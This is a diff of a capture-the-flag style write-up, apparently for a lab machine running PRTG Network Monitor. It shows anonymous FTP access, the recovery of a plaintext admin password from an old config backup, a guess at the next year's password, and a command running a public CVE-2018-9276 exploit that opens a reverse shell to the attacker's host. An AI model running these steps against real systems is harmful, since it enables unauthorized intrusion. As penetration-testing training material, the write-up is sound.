@@ -42,34 +42,47 @@ PORT      STATE    SERVICE      VERSION
 ```
 ### FTP Anon Login
 ![](Images/Pasted%20image%2020250416221722.png)
+
 Under the \Windows directory I found 
 ![](Images/Pasted%20image%2020250416221858.png)
+
 Version confirmation
 `PRTG Network Monitor 18.1.37.13946`
 C:\ProgramData\Paessler is the default directory for the application.
 ![](Images/Pasted%20image%2020250416222803.png)
+
 Lets grab the whole directory to read locally.
 `wget -r ftp://10.129.230.176/ProgramData/Paessler`
 
 Also Anon FTP allowed us to get the user flag
 ![](Images/Pasted%20image%2020250416222632.png)
+
 In the directory seems to be an old backup of the configuration I wonder if we can find something
 ![](Images/Pasted%20image%2020250416223001.png)
+
 Bingo
 prtgadmin:PrTg@dmin2018
+
 ![](Images/Pasted%20image%2020250416223025.png)
+
 ![](Images/Pasted%20image%2020250416223453.png)
+
 Since this is an old configuration, typical users like changing the year when they have to adjust passwords so lets try the next year in line.
 `prtgadmin:PrTg@dmin2019`
 ![](Images/Pasted%20image%2020250416223526.png)
+
 ## Exploitation
 ![](Images/Pasted%20image%2020250416222123.png)
+
 The only promising one looks like it requires authentication so I will probably need to enumerate further
 prtgadmin:PrTg@dmin2019
 https://github.com/A1vinSmith/CVE-2018-9276
 
 `./exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.251 --lport 4444 --user prtgadmin --password PrTg@dmin2019`
 ![](Images/Pasted%20image%2020250416223859.png)
+
 That was a quick easy root
+
 ![](Images/Pasted%20image%2020250416223928.png)
+
 ![](Images/Pasted%20image%2020250416223954.png)
